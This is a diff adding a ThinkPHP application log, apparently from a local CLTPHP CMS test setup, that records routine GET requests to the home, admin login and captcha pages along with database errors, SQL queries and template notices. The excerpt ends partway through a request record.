@@ -1,0 +1,2921 @@
+---------------------------------------------------------------
+[ 2018-07-05T23:16:50+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.217477s][吞吐率：4.60req/s] [内存消耗：520.14kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [1045]SQLSTATE[28000] [1045] Access denied for user 'root'@'localhost' (using password: YES)[/var/www/html/think/library/think/db/Connection.php:293]
+---------------------------------------------------------------
+[ 2018-07-05T23:21:37+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.090919s][吞吐率：11.00req/s] [内存消耗：506.94kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [1045]SQLSTATE[28000] [1045] Access denied for user 'root'@'localhost' (using password: NO)[/var/www/html/think/library/think/db/Connection.php:293]
+---------------------------------------------------------------
+[ 2018-07-05T23:21:38+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.054071s][吞吐率：18.49req/s] [内存消耗：506.11kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [1045]SQLSTATE[28000] [1045] Access denied for user 'root'@'localhost' (using password: NO)[/var/www/html/think/library/think/db/Connection.php:293]
+---------------------------------------------------------------
+[ 2018-07-05T23:21:54+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.077195s][吞吐率：12.95req/s] [内存消耗：506.80kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [1049]SQLSTATE[42000] [1049] Unknown database 'cltphp_db'[/var/www/html/think/library/think/db/Connection.php:293]
+---------------------------------------------------------------
+[ 2018-07-05T23:22:57+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.115587s][吞吐率：8.65req/s] [内存消耗：920.86kb] [文件加载：56]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\home\controller\Index->index[ /var/www/html/app/home/controller/Index.php ]
+[ info ] [ VIEW ] /var/www/html/app/home/view/index_index.html [ array (
+  0 => 'sys',
+  1 => 'action',
+  2 => 'controller',
+  3 => 'title',
+  4 => 'keywords',
+  5 => 'description',
+  6 => 'category',
+  7 => 'adList',
+  8 => 'linkList',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000433s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_category` [ RunTime:0.003099s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000337s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `parentid` = 0  AND `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.000590s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `ismenu` = 1 ORDER BY `listorder` [ RunTime:0.000352s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_ad` [ RunTime:0.001500s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_ad` WHERE  `type_id` = 1  AND `open` = 1 ORDER BY sort asc LIMIT 4 [ RunTime:0.000478s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_link` [ RunTime:0.000802s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_link` WHERE  `open` = 1 ORDER BY sort asc [ RunTime:0.000297s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_article` [ RunTime:0.000691s ]
+[ sql ] [ SQL ] SELECT `a`.*,`c`.`catdir` FROM `clt_article` `a` LEFT JOIN `clt_category` `c` ON `a`.`catid`=`c`.`id` WHERE  (  posid = 1 ) ORDER BY listorder asc,createtime desc LIMIT 4 [ RunTime:0.000502s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_debris` [ RunTime:0.001005s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_debris` WHERE  (  type_id = 1 ) LIMIT 3 [ RunTime:0.000424s ]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:11]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:12]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:13]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+---------------------------------------------------------------
+[ 2018-07-05T23:23:29+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.095225s][吞吐率：10.50req/s] [内存消耗：896.00kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\home\controller\Index->index[ /var/www/html/app/home/controller/Index.php ]
+[ info ] [ VIEW ] /var/www/html/app/home/view/index_index.html [ array (
+  0 => 'sys',
+  1 => 'action',
+  2 => 'controller',
+  3 => 'title',
+  4 => 'keywords',
+  5 => 'description',
+  6 => 'category',
+  7 => 'adList',
+  8 => 'linkList',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001094s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_category` [ RunTime:0.000886s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000247s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_article` [ RunTime:0.000795s ]
+[ sql ] [ SQL ] SELECT `a`.*,`c`.`catdir` FROM `clt_article` `a` LEFT JOIN `clt_category` `c` ON `a`.`catid`=`c`.`id` WHERE  (  posid = 1 ) ORDER BY listorder asc,createtime desc LIMIT 4 [ RunTime:0.000386s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_debris` [ RunTime:0.001191s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_debris` WHERE  (  type_id = 1 ) LIMIT 3 [ RunTime:0.000178s ]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:11]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:12]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:13]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+---------------------------------------------------------------
+[ 2018-07-05T23:24:11+08:00 ] 172.17.0.1 GET /
+[ info ] 127.0.0.1/ [运行时间：0.087863s][吞吐率：11.38req/s] [内存消耗：896.00kb] [文件加载：55]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\home\controller\Index->index[ /var/www/html/app/home/controller/Index.php ]
+[ info ] [ VIEW ] /var/www/html/app/home/view/index_index.html [ array (
+  0 => 'sys',
+  1 => 'action',
+  2 => 'controller',
+  3 => 'title',
+  4 => 'keywords',
+  5 => 'description',
+  6 => 'category',
+  7 => 'adList',
+  8 => 'linkList',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001078s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_category` [ RunTime:0.000728s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_category` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000210s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_article` [ RunTime:0.001175s ]
+[ sql ] [ SQL ] SELECT `a`.*,`c`.`catdir` FROM `clt_article` `a` LEFT JOIN `clt_category` `c` ON `a`.`catid`=`c`.`id` WHERE  (  posid = 1 ) ORDER BY listorder asc,createtime desc LIMIT 4 [ RunTime:0.000267s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_debris` [ RunTime:0.000544s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_debris` WHERE  (  type_id = 1 ) LIMIT 3 [ RunTime:0.000160s ]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:11]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:12]
+[ error ] [8]未定义变量: info[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:13]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+[ error ] [8]未定义数组索引: title_thumb[/var/www/html/runtime/temp/32d92f36780154d3751b0713101b4a3b.php:232]
+---------------------------------------------------------------
+[ 2018-07-05T23:24:56+08:00 ] 172.17.0.1 GET /index.php/admin
+[ info ] 127.0.0.1/index.php/admin [运行时间：0.091878s][吞吐率：10.88req/s] [内存消耗：415.61kb] [文件加载：43]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:24:56+08:00 ] 172.17.0.1 GET /index.php/admin/login/index.html
+[ info ] 127.0.0.1/index.php/admin/login/index.html [运行时间：0.044067s][吞吐率：22.69req/s] [内存消耗：391.42kb] [文件加载：42]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/html/app/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:24:56+08:00 ] 172.17.0.1 GET /index.php/captcha.html
+[ info ] 127.0.0.1/index.php/captcha.html [运行时间：0.099291s][吞吐率：10.07req/s] [内存消耗：321.95kb] [文件加载：32]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/index.php/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /var/www/html/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:39+08:00 ] 172.17.0.1 GET /index.php/admin/login/index.html
+[ info ] 127.0.0.1/index.php/admin/login/index.html [运行时间：0.179013s][吞吐率：5.59req/s] [内存消耗：399.69kb] [文件加载：42]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/html/app/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:39+08:00 ] 172.17.0.1 GET /index.php/captcha.html
+[ info ] 127.0.0.1/index.php/captcha.html [运行时间：0.056541s][吞吐率：17.69req/s] [内存消耗：321.94kb] [文件加载：32]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/index.php/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /var/www/html/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:44+08:00 ] 172.17.0.1 GET /admin
+[ info ] 127.0.0.1/admin [运行时间：0.083003s][吞吐率：12.05req/s] [内存消耗：420.52kb] [文件加载：43]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
